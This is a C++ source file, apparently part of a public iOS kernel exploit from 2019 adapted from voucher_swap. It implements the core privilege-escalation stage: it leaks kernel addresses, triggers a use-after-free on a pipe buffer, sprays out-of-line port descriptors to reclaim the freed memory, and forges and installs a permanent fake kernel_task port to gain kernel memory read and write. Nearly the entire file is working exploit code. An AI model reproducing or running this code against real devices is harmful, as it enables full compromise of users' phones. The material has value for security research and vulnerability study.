// <3 nedwill 2019
#include "exploit.h"

#include <unistd.h>

extern "C" {
#include "ipc_port.h"
#include "kernel_alloc.h"
#include "kernel_memory.h"
#include "mach_vm.h"
#include "parameters.h"
}

#include "pipe.h"
#include "stage1.h"
#include "util.h"

const uint32_t kPipeBufferSize = 16384;

uint32_t getOffset()
{
  #if __arm64e__
     return 0x368;
  #else
     return 0x358;
  #endif
}

Exploit::Exploit() : ipc_space_kernel_(0), kernel_map_(0), host_port_(0) {}
Exploit::~Exploit() {}

bool Exploit::GetFdOfiles(uint64_t *fd_ofiles) {
  StageOne stage_one;

  uint64_t task_port;
  if (!stage_one.GetPortAddr(mach_task_self(), &task_port)) {
    printf("Failed to fetch task_port kaddr\n");
    return false;
  }

  // task -> proc -> fd table -> open files array (fd_ofiles)
  std::vector<uint64_t> task_to_fd_ofiles = {
      OFFSET(ipc_port, ip_kobject),
      getOffset(),
      OFFSET(proc, p_fd),
      OFFSET(filedesc, fd_ofiles),
  };

  if (!stage_one.ReadMany(task_port, task_to_fd_ofiles, fd_ofiles)) {
    printf("Failed to leak fd_ofiles\n");
    return false;
  }

  return true;
}

bool Exploit::GetHostPort(uint64_t *host_port) {
  if (host_port_) {
    *host_port = host_port_;
    return true;
  }

  StageOne stage_one;
  if (!stage_one.GetPortAddr(mach_host_self(), &host_port_)) {
    printf("Failed to leak OOL descriptor\n");
    return false;
  }

  *host_port = host_port_;
  return true;
}

bool Exploit::GetIpcSpaceKernel(uint64_t *ipc_space_kernel) {
  if (ipc_space_kernel_) {
    *ipc_space_kernel = ipc_space_kernel_;
    return true;
  }

  uint64_t host_port;
  if (!GetHostPort(&host_port)) {
    return false;
  }

  StageOne stage_one;
  if (!stage_one.Read<uint64_t>(host_port + OFFSET(ipc_port, ip_receiver),
                                &ipc_space_kernel_)) {
    printf("Failed to fetch host_port_ip_receiver\n");
    return false;
  }

  *ipc_space_kernel = ipc_space_kernel_;
  return true;
}

bool Exploit::GetKernelMap(uint64_t *kernel_map) {
  if (kernel_map_) {
    *kernel_map = kernel_map_;
    return true;
  }

  uint64_t host_port;
  if (!GetHostPort(&host_port)) {
    return false;
  }

  StageOne stage_one;
  if (!stage_one.GetKernelTaskFromHostPort(host_port, &kernel_task)) {
    printf("Failed to get kernel task\n");
    return false;
  }

  // Make sure we got the kernel_task's address.
  if (kernel_task == 0) {
    printf("could not find kernel_task port\n");
    return false;
  }

  // 25. Next we can use the kernel task to get the address of the kernel
  // vm_map.
  if (!stage_one.Read<uint64_t>(kernel_task + OFFSET(task, map),
                                &kernel_map_)) {
    printf("Failed to read kernel_map\n");
    return false;
  }

  *kernel_map = kernel_map_;
  return true;
}

// Adapted from voucher_swap.
// Installs the fake kernel_task port to data, where data is mapped in the
// kernel at kernel_address.
bool Exploit::BuildFakeKernelTask(void *data, uint64_t kernel_address) {
  uint64_t ipc_space_kernel;
  if (!GetIpcSpaceKernel(&ipc_space_kernel)) {
    return false;
  }

  uint64_t kernel_map;
  if (!GetKernelMap(&kernel_map)) {
    return false;
  }

  size_t task_offset = SIZE(ipc_port);
  size_t port_offset = 0;
  // Create our fake kernel_task.
  uint8_t *fake_task = (uint8_t *)data + task_offset;
  uint64_t fake_task_address = kernel_address + task_offset;
  FIELD(fake_task, task, lck_mtx_type, uint8_t) = 0x22;
  FIELD(fake_task, task, ref_count, uint64_t) = 0x1000;
  FIELD(fake_task, task, active, uint32_t) = 1;
  FIELD(fake_task, task, map, uint64_t) = kernel_map;
  // Initialize the port as a fake task port pointing to our fake kernel_task.
  uint8_t *fake_port_data = (uint8_t *)data + port_offset;
  FIELD(fake_port_data, ipc_port, ip_bits, uint32_t) =
      io_makebits(1, IOT_PORT, IKOT_TASK);
  FIELD(fake_port_data, ipc_port, ip_references, uint32_t) = 0x1000;
  FIELD(fake_port_data, ipc_port, ip_receiver, uint64_t) = ipc_space_kernel;
  FIELD(fake_port_data, ipc_port, ip_kobject, uint64_t) = fake_task_address;
  FIELD(fake_port_data, ipc_port, ip_mscount, uint32_t) = 1;
  FIELD(fake_port_data, ipc_port, ip_srights, uint32_t) = 0x1000;
  return true;
}

// Adapted from voucher_swap.
// Assuming kernel_task port is available using a temporary buffer (pipes),
// creates a persistent kernel_task port mapped into its own page in the kernel.
bool Exploit::InstallPermanentFakePort() {
  size_t size = 0x800;
  mach_vm_address_t fake_port_page;
  kern_return_t kr = mach_vm_allocate(kernel_task_port, &fake_port_page, size,
                                      VM_FLAGS_ANYWHERE);
  if (kr != KERN_SUCCESS) {
    printf("%s returned %d: %s\n", "mach_vm_allocate", kr,
           mach_error_string(kr));
    return false;
  }

  std::unique_ptr<uint8_t[]> data(new uint8_t[size]);
  memset(data.get(), 0, size);
  assert(data != NULL);
  if (!BuildFakeKernelTask(data.get(), fake_port_page)) {
    printf("Failed to build fake kernel task\n");
    return false;
  }

  if (!kernel_write(fake_port_page, data.get(), size)) {
    printf("could not write fake kernel_task into kernel memory\n");
    return false;
  }

  // Modify kernel_task_port's ipc_entry so that it points to our new fake port.
  uint64_t ipc_entry;
  if (!kernel_ipc_port_lookup(current_task, kernel_task_port, NULL,
                              &ipc_entry)) {
    printf("could not look up the IPC entry for the fake port\n");
    return false;
  }

  kernel_write64(ipc_entry + OFFSET(ipc_entry, ie_object), fake_port_page);
  // Clear ie_request to avoid a panic on termination.
  kernel_write32(ipc_entry + OFFSET(ipc_entry, ie_request), 0);
  return true;
}

bool Exploit::GetKernelTaskPort() {
  uint64_t fd_ofiles;
  if (!GetFdOfiles(&fd_ofiles)) {
    printf("Failed to fetch fd_ofiles\n");
    return false;
  }

  // Pipe where we store faked port and task structs
  Pipe fake_port_pipe(kPipeBufferSize, fd_ofiles);
  if (!fake_port_pipe.Valid()) {
    printf("Fake port pipe is invalid\n");
    return false;
  }

  // Pipe where we overwrite OOL descriptors. Its buffer gets freed.
  Pipe uaf_pipe(kPipeBufferSize, fd_ofiles);
  if (!uaf_pipe.Valid()) {
    printf("UaF pipe is invalid\n");
    return false;
  }

  // Setup a broken kernel task that can survive deallocation.
  // We will update this with correct values later.
  if (!fake_port_pipe.Read()) {
    printf("Failed to read fake port pipe\n");
    return false;
  }
  fake_port_pipe.ClearBuffer();
  if (!BuildFakeKernelTask(fake_port_pipe.buffer(),
                           fake_port_pipe.buffer_kaddr())) {
    printf("Failed to build fake kernel task\n");
    return false;
  }
  if (!fake_port_pipe.Write()) {
    printf("Failed to write fake port pipe\n");
    return false;
  }

  StageOne stage_one;
  // Memory corruption starts here. We will have to cleanup this pipe buffer
  // and take responsibility for anything we overwrite using the pipe buffer,
  // namely the OOL port descriptors.
  if (!stage_one.FreeAddress((void *)uaf_pipe.buffer_kaddr())) {
    printf("Failed to free uaf_pipe_buffer_kaddr\n");
    return false;
  }

  Sprayer sprayer;
  bool reclaimed = false;
  for (int i = 0; i < 100; i++) {
    // Spray task port address since we'll be able to take advantage
    // of that later.
    if (!sprayer.SprayOOLPorts(kPipeBufferSize, mach_task_self())) {
      printf("Failed to spray OOL ports again\n");
      return false;
    }
    if (!uaf_pipe.Read()) {
      printf("failed to read uaf pipe\n");
      return false;
    }
    if (LooksLikeKaddr(*(uint64_t *)uaf_pipe.buffer())) {
      reclaimed = true;
      break;
    }
    if (!uaf_pipe.Write()) {
      printf("failed to write uaf pipe\n");
      return false;
    }
  }
  if (!reclaimed) {
    printf("Second OOL spray failed\n");
    return false;
  }

  uint64_t task_port_address = ((uint64_t *)uaf_pipe.buffer())[0];

  // Overwrite our own task ipc_port pointer to the fake kernel_task ipc_port.
  // TODO(nedwill): doesn't this leak a reference to the task port which
  // will need cleanup?
  ((uint64_t *)uaf_pipe.buffer())[0] = fake_port_pipe.buffer_kaddr();
  if (!uaf_pipe.Write()) {
    printf("failed to write uaf pipe with fake port address\n");
    return false;
  }

  // Now receive the sprayed messages and look for the overwritten
  // fake kernel_task port.
  kernel_task_port = MACH_PORT_NULL;
  std::vector<mach_port_t> holding_ports;
  for (const std::unique_ptr<OOLHoldingPort> &port :
       sprayer.ool_holding_ports()) {
    holding_ports.push_back(port.get()->get());
  }
  ool_ports_spray_receive(
      holding_ports.data(), holding_ports.size(),
      ^(mach_port_t *ool_ports, size_t count) {
        if (kernel_task_port != MACH_PORT_NULL) {
          return;
        }

        // Only first port has the potential to be overwritten
        mach_port_t maybe_fake_port = ool_ports[0];
        if (!MACH_PORT_VALID(maybe_fake_port)) {
          return;
        }

        kernel_task_port = maybe_fake_port;
        uint64_t test = 0;
        // Reading a kernel pointer should succeed if we
        // have the kernel_task port.
        if (kernel_read(fd_ofiles, &test, 8)) {
          printf("kernel_task port found; read 0x%llx from 0x%llx\n", test,
                 fd_ofiles);
          // take ownership of the kernel task port
          ool_ports[0] = MACH_PORT_NULL;
          return;
        }
        printf("Trying next potential kernel_task port...\n");
        kernel_task_port = MACH_PORT_NULL;
      });

  if (!MACH_PORT_VALID(kernel_task_port)) {
    printf("We failed... we're going to kernel panic :(\n");
    sleep(1);
    return false;
  }

  // Clear uaf_pipe buffer pointer so we don't double free.
  kernel_write64(uaf_pipe.buffer_ptr_kaddr(), 0);

  // Initialize current_task before installing permanent fake port.
  uint64_t task_pointer = task_port_address + OFFSET(ipc_port, ip_kobject);
  current_task = kernel_read64(task_pointer);

  if (!InstallPermanentFakePort()) {
    printf("Failed to create permanent fake_port\n");
    return false;
  }

  // RAII will clean up our resources on function return
  printf("Copied fake kernel_task port to its own page, cleaning up...\n");

  return true;
}
